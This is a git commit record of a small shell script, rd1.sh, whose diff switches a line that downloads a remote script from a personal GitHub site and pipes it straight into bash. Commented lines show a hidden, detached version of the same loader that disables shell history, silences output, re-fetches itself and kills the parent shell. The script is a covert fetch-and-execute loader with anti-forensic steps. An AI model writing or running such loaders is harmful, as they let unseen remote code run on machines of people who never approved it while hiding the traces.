efe753b62017ed0eb687e001859d5da92eb087ed
skyf0l <tom.rorato@epitech.eu>
2021-05-06 15:41:51 +0200

    Update rd1.sh

--- rd1.sh
+++ rd1.sh
@@ -1,4 +1,4 @@
 # export HISTFILE=/dev/null
 # (nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/rd1.sh 2> /dev/null&disown)|nohup bash >& /dev/null&disown;kill -9 $$
 
-curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh | bash
+curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/pib.sh | bash
